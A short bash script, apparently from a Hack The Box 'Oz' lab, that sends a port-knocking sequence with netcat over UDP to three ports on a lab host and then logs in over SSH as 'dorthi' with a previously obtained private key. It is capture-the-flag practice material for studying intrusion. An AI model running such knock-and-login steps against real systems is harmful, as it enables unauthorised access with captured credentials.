#!/bin/bash


ports="40809 50212 46969"
for port in ${ports};do
	echo "[+]Knocking port ${port}"
	echo "bhosa" | nc -u -w 1 10.129.29.198 ${port}
	sleep 0.1
done
ssh -i ~/wargames/hackthebox/oz/dorthi.key dorthi@oz.htb